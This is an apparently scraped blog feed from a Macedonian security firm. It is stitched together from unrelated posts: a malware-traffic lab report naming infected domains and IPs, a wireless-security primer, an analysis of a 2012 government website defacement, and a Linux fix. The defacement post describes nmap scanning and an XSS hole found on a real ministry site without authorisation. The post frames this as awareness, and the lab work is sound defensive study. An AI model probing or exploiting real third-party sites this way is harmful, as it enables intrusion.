is better solution. With the following attributes:&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The above table give as an perfect over view, which tool is easy to use,
provides enough information, disinfected information and gain the
highest mark.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;I would like to generalize that from the above information we see that
each online analysing tool has own means, criteria and different
information to distribute. On the whole, some of them were not that easy
and simple to use, yet they provide as with expectant information and
disinfected solutions. Therefore, our succeeder for this test
is ThreatExpert. But bear in mind that I have not measure and compare
all the online tool-kits for analysing the files, just the ones listed
in the previous section. For furthermore, please refer to the following
article that was publish in 2010 by Lenny Zeltser
[MalwareAnalysisToolkit].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In summary, we found out that the chosen files are malware. Likewise,
can harm our computer in different methods. Yet we got an information
for some, for instance how to disinfected the computer. Therefore, we
made a comparison table to scale the best online analysing tool for
malware. Where total number is 6 tools, and different score rank. The
first one is TheratExpert, secondly is Virustotal.com and the third is
Netscty. Still all of mentioned tools score difference with one point.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Your IT infrastructure could be taken under the shoulder of
professionals&lt;/p&gt;
&lt;p&gt;September 2012&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Founder Notes:&lt;/p&gt;
&lt;p&gt;Recently, Macedonian government has announced to open a CERT agency.
This news was not only shock to us, but to everyone else, indeed.
However, we are supporting this initiative and hope that will be able to
elaborate and corporate within organization.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Macedonian situation in a field of information and cyber security is not
on very surprising or signification level. Therefore our main goal is to
increase and merge the collaboration with neighbour countries as well as
with international organizations and agencies.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, our belief lies that we will be able to bring better
understanding of very important issues that concern information and
cyber security, and to lead to better national awareness.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In this matter, our company will continue to expend the partnership as
well as international collaboration. We will constantly checking for
updates for existing solutions, also to search for new solutions to
update our offerings and services. And further development of our
projects.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In this brochure we would like to introduce you with our company
profile, such as, our services, partners, clients, projects and our blog
posts.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify possible infection of
malware into the wireshark capture file. The report should highlight the
following aspects:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Download [not avaibale anymore]&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Find malware download in this pcap and extract malware or malwares
find out where malware was downloaded from.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;What malware …&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h1&gt;INTRODUCTION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify possible infection of
malware into the wireshark capture file. The report should highlight the
following aspects:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Download [not avaibale anymore]&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Find malware download in this pcap and extract malware or malwares
find out where malware was downloaded from.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;What malware, malwares changes in system.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;C&amp;amp;C Names and address.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Document the process also where You found hints and how exactly You
did it (you need to show Your thought and communication process – please
write a summary of it.)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Write an incident report.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, we have to consider the malware analysis report reminders,
please refer to [1] or [2]. Additional, analysis it is stated into the
Analysis section, where we explain the techniques, filter tools, gather
knowledge, links, etc. Structure of the laboratory report is first to
present analysis with details information. Malware and infections
description are described. Finally the conclusion made of all analysis
will be concise in summary section.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;ANALYSIS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;To be able to open and use the above file, firstly we have to download
the wireshark tool. Where the main goal and purpose for wireshark
application is to analysis a network protocols from captured file.
Therefore please refer to the following link:
&lt;a href="http://www.wireshark.org/"&gt;http://www.wireshark.org/&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Useful links for future use, please refer to [3, 4, 5 and 6]. On figure
1 it shows the Graphic Interface of Wireshark application with running
filter: http protocol.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 1: Wireshark application, filter: http protocol&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;However, from the figure 1 we can see that there is a lot of traffic
generated by the user. Therefore we have to apply and additional filter
rules, which will help and guide for better and easy analysis. As we go
through each generated http protocol traffic we can conclude that the
user generated and has been visiting different source, where can be
potential threat for the organization and personal use with a different
malicious code.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To be able to filter only the http protocols on port 80 with a header
GET, we should use the following filter: http.request.method == “GET”.
Where this filter will narrow down the results that are presented into
the captured file. In spite of the filter above it helps a lot, yet
there is still a lot of traffic generated, consequently we have to
utilize an additional filter.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Another extremely useful wireshark option we used, was Analyze → Follow
TCP Stream which shows communication between IP addresses in more
readable and useful way: shows DNS name for the IP and if file was
downloaded gives filetype and name. We discovered that IP address
79.137.237.34 belongs to accord-component.ru. When we accessed the site
with various web browsers, all of them showed that it contained malware.&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    GET /serial/index.php HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NETCLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)Connection: Keep-AliveHost: accord-component.ruHTTP/1.1 200 OKServer: nginxDate: Wed, 30 Nov 2011 23:07:18GMTContent-Type: text/htmlTransfer-Encoding: chunkedConnection: keep-aliveX-Powered-By: PHP/5.3.2Content-Encoding: gzip&lt;/pre&gt;&lt;p&gt;Another suspicious IP was 86.63.168.101, where from this IP address brought us to&lt;br&gt;domain name zumlelao.com, but it was un-accessible from browsers. Wireshark showed the User downloaded file 4.exe from zumlelao.com.&lt;/p&gt;&lt;pre class="brush: php"&gt;GET /load.php?file=0HTTP/1.1Accept: image/jpeg, application/x-ms-application, image/gif,application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*Accept-Language: etUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NETCLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)Accept-Encoding: gzip, deflateHost: zumlelao.comConnection: Keep-AliveHTTP/1.1 200 OKDate: Wed, 30 Nov 2011 21:55:02GMTServer: Apache/2X-Powered-By: PHP/5.2.17Cache-Control: publicContent-Disposition: attachment; filename=4.exeContent-Transfer-Encoding: binaryVary: Accept-EncodingContent-Encoding: gzipContent-Length: 10666Keep-Alive: timeout=1, max=100Connection: Keep-AliveContent-Type: application/octet-stream

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Additionally, we can always use an Find function, which will help as to
identify certain traffic or site. Figure 2 demonstrated the usage of the
Find function, accessible from menu Edit -&gt; Find.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 2: Wireshark, Find function&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Other IP addresses that were generated/extracted first the ones with
malware detected:
&lt;code&gt;79.137.237.34 -accord-component.ru; 86.63.168.101 zumlelao.com&lt;/code&gt;. Other
IP’s are:
&lt;code&gt;173.194.32.32 (33,34,41,50,51,52,58,59,60,63), 192.168.123.1, 193.184.164.159 (174,176,185), 193.40.252.83, 193.88.71.156, 194.126.108.69 (70), 194.126.124.136, 194.204.14.49, 195.222.15.74, 199.7.48.190, 209.85.173.95, 123.168.24.204 (209,221,225,229,235), 79.137.237.34, 80.252.91.41 (61), 69.171.228.11, 23.32.89.55, 23.32.99.172, 216.34.181.45 (48), 213.168.24.26, 90.190.148.34 (40), 86.63.168.101, 82.98.58.48, 81.19.238.61.&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;If we run or analysis the above domain names into the google we will
automatic indicated that the zumlelao.com it is an before reported as a
malware site and the second too. Therefore the analysis and the
infection of details of malware are highlighted into the next section.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;INFECTION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Indeed, the above captured file presents traffic generated by the user,
that can be threat for the organization, home user, etc. As from the
previous section demonstrates how to identify if the generated traffic
has infected or has the user visit the malicious code sites. This
section identifies the malicious code and displays their details.
Moreover, the zumlelao.com host it is reported previous as malicious
code site. For this purpose we gather the help from the following link:
&lt;a href="http://sopport.clean-mx.de/"&gt;http://sopport.clean-mx.de/&lt;/a&gt;. Here is the reported malicious,
suspicious code from the above host in the table bellow.&lt;/p&gt;

&lt;p&gt;Furthermore, figure 3 is proving the analysis made through the
wireshark, were one of the above links has been access, for more details
clink on the above link and points in a figure 3:A and B.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 3: Prove of generating traffic of following malware link:

and the IP initiation.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, to get the file itself for analysis, we used Netresec’s
Network Miner 2.1 http://www.netresec.com/?page=NetworkMiner. In Files
menu, it shows all packets as files.We uploaded 4.exe.octet-stream to
virustotal.com – 30 Antivirus software identified as malware Virustotal
link:
&lt;a href="http://www.virustotal.com/file-scan/report.html?id=d6ee8736cd2eae8571b193b28b59dff33e9607237f78b0888d69c70f241bb04b-%201323098398"&gt;http://www.virustotal.com/file-scan/report.html?id=d6ee8736cd2eae8571b193b28b59dff33e9607237f78b0888d69c70f241bb04b-1323098398&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Trojan.Generic.KD malwares usually are classified as Backdoors. It
infects executable files in the system and its main goal is to make
backdoor into the system. It changes registry. In some cases it can put
payload on the infected system, slow it down and make internet browsing
difficult and time consuming. Aim of the malware can be stealing
information or gaining partial/full access of the victim’s system. On
the other hand, Trojan.Generic.KD malwares are difficult to remove from
infected computers. From VirusTotal analysis we can see that various
antivirus software can discover and identify Trojan.Generic.KD.438472.
Therefore one can remove malware by downloading antivirus software
provided by F-Secure, Comodo, Microsoft, Sophos, Symantec, DrWeb, etc.
Here is an example from Dr.Web how to delete Trojan.Generic.KD malware
&lt;a href="http://www.drwebhk.com/en/virus_removal/694829/Trojan.Generic.KD.53986.html"&gt;http://www.drwebhk.com/en/virus_removal/694829/Trojan.Generic.KD.53986.html&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For our case we downloaded Dr.Web CureIt (free edition for home PCs,
which discovered the malware and removed it) –
&lt;a href="http://www.freedrweb.com/download+cureit/?nc=t&amp;amp;lng=en"&gt;http://www.freedrweb.com/download+cureit/?nc=t&amp;amp;lng=en&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Before continuing to disinfect the system, please read and understand
the massage delivered through this forum:
&lt;a href="http://forums.majorgeeks.com/showthread.php?t=35407"&gt;http://forums.majorgeeks.com/showthread.php?t=35407&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;SUMMARY&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Nowadays malicious codes, infection of the system is one of the highest
vector of production work everyday of the organizations. Therefore,
different approaches, advance analysis, troubleshooting, etc. has to be
applicable and stated in every organization. Leaking of data,
information, access of network (internal and external) can be very
harmful for organization and even the home usage of computers.
Therefore, this laboratory report main aim is to provide the reader to
be able to conduct advance analysis of system and their identification
of infection within the wireshark network analysis tool.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;From the above sections in Analysis and in the Infection we have to
follow the steps and links that will help us for a further work.
Meanwhile, the captured generated traffic from the distributed file has
indeed indicated that the system it is infected. Were as an prove we
demonstrate an screen-shot, figure 3, that one of the infected link has
been visited. Likewise, the system of this user is infected. Thus
infection identified name is: TR/Crypt.XPACK.Gen3, where we do supply
and the disinfecting stepwise solution with the above link. Closing, as
there are many different ways, tools, process for analysing the
malicious code behaviours in system this laboratory report is supplying
the reader with advance and stepwise solution for identifying the
infection of the system within advance network analysis wireshark
application.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;WORKLOAD&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;We made analysis on the virtual Windows 7 machine. For virtualization we
used VirtualBox. During analysis each of group member did the same
analysis to cross - reference the results.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;We basically used the following tools: Wireshark, Network Miner and
&lt;a href="http://virustotal.com/"&gt;virustotal.com&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Many organizations – both public and private – nowadays, have
implemented and developed their own security risk assessment template
tool. The main goal for the template is first to analyse work-flow, then
to identify the assets, threat sources and vulnerabilities.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The first wireless telecommunications was established in early 20th
century, within successful transmitted radio signal across Atlantic
Ocean. And it was known as the first wireless communication across the
ocean. However, in this time likewise the computers were not widespread,
the inventors and developers of wireless have not had in mind that this
technology will be so spread and to carry out a security into the
wireless telecommunications. Whereabouts, nowadays computers are
worldwide spread in every home, in every office, and especially when we
are on the road or when we travel. We used them in fact as our main
devices to be able to complete and conduct our everyday tasks throughout
wireless technology. Such as, to share picture, media, use different
instant chatting application, video and voice calls – skype, etc.
Additionally, wireless technologies have been very popular recently, in
home and business users. Due to the fact that it is costs-effective,
useful, no mess cables into the build or house, it is easy to set up,
and it provides a great mobility.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Owing to the expansibility, mobility and usability, the wireless
technology and telecommunication could be at great risk. Therefore, in
this article we will introduce the readers within the different
categories coverage range wireless networks. Then we will go over the
wireless standards, as well as the most commonly known security threats.
Last but not least, we will introduce the readers with the basic
wireless security measures. And finally we will summarise the article
with the conclusion.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Wireless Network&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Wireless network it is used to transport data between devices and among
devices. They are often categorized into three groups based on the
coverage range, such as: Wireless Wide Area Networks (WWAN), WLANs, and
Wireless Personal Area Networks (WPAN). Where WWAN it involves wide
coverage area of technologies, such as, Global System for Mobile
Communication (GSM), 2G cellular, and many other. In the other hand,
WLAN unlike the traditional wired network does not need cables, it
connects computers and other parts to the network using an access point
device, and it has coverage areas of up to 300 feet. In contrast the
WLAN, the WPAN is representing the wireless personal area network
technologies such as Bluetooth and Infra-Red. Please note that these
technologies receive and send information using electromagnetic waves.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Wireless Standards&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Wireless technologies comply with a variety of standards and offer
different levels of security features. The advantages of standards are
to encourage mass production, as well as to allow products from
different vendors to interoperate. For this article we have limited the
discussion to the most commonly known IEEE 802.11 and the Bluetooth
standard.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, the two standards are described below:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;IEEE 802.11 standard. Are first developed in 1997. It is designed to
    support medium range, higher data rate for applications, for
    instance, Ethernet networks and to mobile address and portable
    stations. In addition, WLAN standards are designed for 1 Mbps to 2
    Mbps wireless transmissions. Hence advanced support it was followed
    in 1999 by 802.11a, then by 802.11b standard, where the later on the
    security vulnerabilities of the standard have been exposed. Another
    standard still in draft has been developed – 802.11g, yet the
    massive WLAN productions now are based on the 802.11b standard.&lt;/li&gt;
&lt;li&gt;Bluetooth standard. It is an ad-hoc network standard. Are designed
    owing to interconnect different types of devices between each
    other’s, such as computers, mobile phones, PDAs, etc. Their
    applications include wireless synchronization, e-mail, internet
    access using personal computer connections, hands free headsets and
    car kits, and many others.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h1&gt;Wireless Security Threats&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;As the effect of that the wireless networks are widely spread and they
are available around us it represents the potential treats in wireless
network. Also the security threats could be made from errors and to
personal privacy. However, the most commonly known concerns in wireless
security are devices theft, vulnerabilities, denial of service attacks,
malicious code and hackers, services theft and foreign and industrial
espionage. Moreover, authorized and unauthorized access of the wireless
device may commit fraud and theft. As well as, malicious hackers may
break into a network without authorizations, by exploiting the
vulnerability, by brute forcing the password or other security
vulnerability flow to do hard or to gain personal information or needs.
In addition, malicious hackers or crackers are usually people from
outside of an organization or agency. Conversely, users within
organization and agency are a threat as well. Furthermore, they could
gain access to the wireless access point by eavesdropping on wireless
device communication. Additionally, malicious code includes such as,
worms, Trojan horses, viruses, or other unwanted code, application that
are designed for purpose to damage files or bring down the system or the
entire network. Service theft is when for instance an unauthorized user
gains access to the network and in worst case customer data or network
resources. And last, foreign and industrial espionage covers gathering
data from corporation or intelligence information from government.
Especially in wireless network espionage is very simple because the
transmission of data is across radio waves.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Wireless Security Measures&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;From the previous paragraph we can conclude that actually wireless
network it has different approaches and methods of threats. Therefore,
in this section we will concentrate of how to apply security measures in
our wireless network, either are for a personal or organizational usage.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;First step is to create a Security Policy. It defines what it means to
be secure, as well as includes restrictions on wireless LAN functions,
traffic, flow, and access. Second is to configure for Secured Network
Access, by implementing and configuring setup password protection, also
to physically secure the WLAN and to secure the WLAN. It can be secured
from intruders by wireless authentication, such as: WEP (Wired
Equivalency Privacy) – which can be hacked very easily); WPA and WPA2
(Wi-Fi Protected Access) – are more secure alternatives, where unlike
the WEP and WPA, WPA uses the AES (Advance Encryption Standard) and it
supports two modes of authentication – WPA2-PSK (Pre-shared key) and
WPA2-Enterprise (EAP/RADIUS) mode. Thirdly by controlling wireless
visibility by Service Set Identifier (SSID), this is visible and real
name of the wireless network. Last but not least, by securing the
network with virtual segmentation, called Virtual LAN. Finally, we
recommend on-going security maintenance and continue education.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Today wireless networks are helping and definitely providing the
opportunity to the organizations, individuals and business to cut costs,
to increase the productivity and mobility. By following the above
recommended security measures the everyday work will in fact continue
without any interference. The key to keep up and creating a security
wireless network is on-going running business and organization.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;Yesterday, the 25 of June 2012, the Macedonian website of Ministry of
Interior (MVR) was defaced by Kosovo Network Security (KNS) group, below
figure. However, after we have noticed and some of the social networking
sites have informed me, I was concern to find out what just have
happened …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Purpose&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Yesterday, the 25 of June 2012, the Macedonian website of Ministry of
Interior (MVR) was defaced by Kosovo Network Security (KNS) group, below
figure. However, after we have noticed and some of the social networking
sites have informed me, I was concern to find out what just have
happened and how did happen, and of course how they have done it. So for
this purpose, I have done some digging into details, about the previous
defacement activities of this very important government site. But before
we continue with more details, let just talk about the situation of
yesterday and what did the authorities take protective measures steps
and actions.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;On Monday, 25 June 2012 at 19:38, one friend have updated his status in
one of the social networking sites, as follows: “Хакован
&lt;a href="http://mvr.gov.mk/"&gt;http://mvr.gov.mk/&lt;/a&gt;” (Hacked &lt;a href="http://mvr.gov.mk/"&gt;http://mvr.gov.mk/&lt;/a&gt;). And it made me
extremely intrigue to see what actually have just happened. The below
figure, displays the message spread from the KNS group.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Screenshot from the mvr.gov.mk defaced version&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, what makes the situation even more interesting is that after
the report that the site was defaced the authorities have taken a
measures steps to fix the issue, by either shutting down the server or
restoring the content of the site from the backup. Then after one or two
minutes the site was defaced again. I did not want to lose the time and
the nervous to check every five or ten minutes to see when it will be
back again.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Nevertheless, after 15 hours, or one stressful – hard core night for the
administrators of the site, the usability and functionalities where back
as normal, let just see how long will stay!&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, in the current post the idea is to give and overview, of what
actually is going on when it comes to case of cyber space, cyber
security issues in Macedonia. The structure of this post is introduces
first with the issue, or the problem that actuality made me to write
this post. Followed by the background investigation about the previous
defacement activities on the Ministry of Interior website in Macedonia.
Then with the background investigation about the KNS group, moreover,
with the self pen-testing site with different attacking methodologies.
And finally, closing by with a conclusion and action plan that should be
taken, for hence actions. This post does not only involves the public
sector, but even and the private sector too. Those agencies,
organizations are too much careless and do not take any actions of
securing their IT assets.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Ministry of Interior in Macedonia site offers different online services.
The site primary idea is to inform the inhabitance about the news,
actions, useful information, public relations, analysis and statistics;
international cooperation and legislation; and finally the services. And
secondly is to give and opportunities to the population scheduling of
service, if their document is issued, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In one short sentence, this site, for some people, it may be very useful
or not. However, I need to empathize that the site is only available in
Macedonian language, nor Albania, nor English version. So, in simple
conclusion this site is only useful for Macedonian speakers, and not for
foreigners, yet still represents one of very important public service,
government agency.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Nevertheless, in the next section we will discuses the previous
defacement and hacking attacks of this site.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Background&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The service of this site, or the domain first was registered in 22
October 2003, and unfortunate I do not remember when was first time
available and published. However, in the pass years I have heard many
times that this site was defaced and hacked, but still no actions or
results were shown. Therefore, it made me very interesting to find out,
if this defacement activities where notified and when and how many
where. For this purpose I have use a site service that I know few years
ago, the &lt;a href="http://www.zone-h.org/"&gt;Zone-H&lt;/a&gt;. Moreover,
&lt;a href="http://www.zone-h.org/"&gt;Zone-H&lt;/a&gt; is neither responsible for the reported
computer crimes nor it is directly or indirectly involved with them, it
is just and simple site where collects the cybercrime activities
notified anonymously. The bellow figure provides a details of previous
reported/notified cybercrime activities of MVR site in Macedonia.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In details, total notifications are 4 of which 2 are single IP and 2 are
mass defacements. The first mass defacement was done in 29 July 2009,
when the site use a OS: Windows 2000, then in 2011 it was the
re-defacement and the server operating system is Windows 2008. Followed
by the other massive defacement in this year 2012 in March 18, and same
year, few days before the current attack, 22 of June it was
re-defacement. And the attack, defacement that we write for it was not
notified or reported.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;From these data, and schedule, we can come to a conclusion that the site
was defaced just 3 days before the mass defacement attack, so it might
be a simple warning, to taken an action before something goes really
wrong. But most probably, non of those administrators, or authorities
did not taken any serious actions, until the case yesterday appears.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Details&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;To be able to do an analysis of what actually have happened, we need to
take some actions.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;First, we have done a simple web sniffer, to find out what kind of
system, and services the site, server is using. If we request the &lt;a href="http://en.wikipedia.org/wiki/List_of_HTTP_header_fields"&gt;HTTP
Request Header&lt;/a&gt;
we will receive an HTTP Response Header with a following data:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    Status: HTTP/1.1 200 OKCache-Control: privateContent-Type: text/html; charset=utf-8Server: Microsoft-IIS/7.0Set-Cookie: ASP.NET_SessionId=3lti3gep3usg4255ggf34tjn; path=/; HttpOnlyX-AspNet-Version: 2.0.50727X-Powered-By: ASP.NETDate: Tue, 26 Jun 2012 08:18:34 GMTConnection: closeContent-Length: 103773

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;The above data, is useful in a sense that provides as an information
about the Server and the ASP.Net Version. Then, if we want to find more
details about the open and close ports and operating system we can use
the &lt;a href="http://nmap.org/"&gt;nmap&lt;/a&gt; tool with the following command line:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;nmap -O -v IP-Address&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;And the results will be as follows:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    PORT STATE SERVICE21/tcp open ftp80/tcp open httpRunning (JUST GUESSING) : Microsoft Windows Vista|2008|7 (89%)

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;From the web sniffing and from the OS version scanning we can assume
that the server is running Microsoft Windows 2008. The current
vulnerabilities and possible exploitations are visible on the &lt;a href="http://technet.microsoft.com/en-us/security/bulletin/"&gt;Microsoft
Security
Bulletins&lt;/a&gt;
website. By knowing the vulnerabilities it is very easy task to find out
a way either to commit DoS attack or remote server access. However, in
this post we will not go into details and exploitation descriptions.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, the KNS, we assume the domain is followed:
&lt;a href="http://kns-team.com/"&gt;http://kns-team.com&lt;/a&gt;. However, the site is down,
therefore, we will have to understand who is behind this domain
registration. Therefore, we will use the whois database to understand
more, or even we can use another site that have been defaced by this
group to find out more. So there is the list presented the members in
the groups and their archive of notified defaced sites:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.zone-h.org/archive/notifier=cracker-besi"&gt;rAcKeR-BeSi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;GP&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zone-h.org/archive/notifier=L0wHacker"&gt;L0wHacker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;sLizer&lt;/li&gt;
&lt;li&gt;X-r00t&lt;/li&gt;
&lt;li&gt;SpyHackz&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;The Facebook fan page is:
&lt;a href="https://www.facebook.com/pages/Kosova-Network-Security/176195849098989"&gt;https://www.facebook.com/pages/Kosova-Network-Security/176195849098989&lt;/a&gt;.
For more info I was short of time to do more digging, but I hope that
someone will.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Action&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;After understanding the details about the MVR site, operating system and
their server services, and information about the KNS, it is time to take
an action of trying to see how vulnerable is MVR site, and to see if
these lads had very difficult time of defacing the content of the site,
or even gaining access to the server-side.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;But before, we carry on, I want to stress out that this section is not
to give you an idea how, or knowledge to exploit or use any
vulnerabilities to deface or gain access to the site. We will just
demonstrate you a very simple
&lt;a href="http://en.wikipedia.org/wiki/Cross-site_scripting"&gt;XSS&lt;/a&gt; exploit of MVR
site that we have found a vulnerability, figure below.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Example of exploitation by XSS vulnerability, mvr.gov.mk&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;It is therefore, from this very simple and easy exploitation of XSS
vulnerability of the MVS site we will be able to run more advance and
complicated shell scripts to gain access and maintain access of the
server. Our initial idea is not to show you how to do it, but to expose
to the audience that actually hence actions is need it. And we hope that
the administrators, developers and the authorities will take an action
of mitigating the risk, and further vulnerabilities of the site.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In Macedonia, cyber space, cyber crime, cyber security, cyber warefare,
cyber terrorism are actually unknown words, terminology. They are not
even specified or added into the Macedonian dictionary, nor in IT
dictionary. However, this is not the first or least defacement, attack
that has happened in Macedonia, nor the first attack that has been done,
implemented by neighbor countries, or someone else. I just don’t
understand why people in this country are so careless about how to
protect their IT assets, and everything else, as well.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Furthermore, it is not an issue that we do not have specialists to
conduct a pen-testing to the sites and services that not only the
government agencies are offering but even the banks and private sectors
as well. We even have a cyber crime unit in Ministry of Interior, and
one of very successful information security research and development
laboratory in Macedonia: &lt;a href="http://www.zeroscience.mk/en/"&gt;Zero Science
Lab&lt;/a&gt;. Also, the &lt;a href="http://cybersecurity.mk/icsap/"&gt;ICSAP – Interactive
Cyber Security Awareness Program&lt;/a&gt;,
Macedonia project, developed by myself.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Nevertheless, in final conclusion, I would like to recommend the
authorities to take actions about the above described activities done by
KNS and hope that the security awareness will boost up, and the further
actions will be considered of securing cyber space.&lt;/p&gt;

    Where we can see from the above output that the ```libpoppler-qt4.so.3 = not found ``` is missing.The best way to solve this issue, first we have to locate where are the other libraries of QT4. This is very simple approach, because the other libraries links, location is provided from the above output. Therefore, we can see that in the path ```/usr/lib/i386-linux-gnu/``` there is an library called: ```libpoppler-qt4.so.4```.# ResolutionFrom the above output, and the path that we have found of the missing library, there is an simple and easy way of fixing this issue, shown below.Therefore, in the terminal we can make an soft link with the missing library from the already existing one, with the following:```sudo ln -s /usr/lib/i386-linux-gnu/libpoppler-qt4.so.4 /usr/lib/i386-linux-gnu/libpoppler-qt4.so.3```And now the texworks works perfectly!# Details

&lt;p&gt;To get an idea of what was the content of training I have provided you
with the slides below, as well as the pictures taken during training.
Unfortunately, the presentation slides are only in Macedonian language.
If anyone needs the content on the slides in English please fell free to
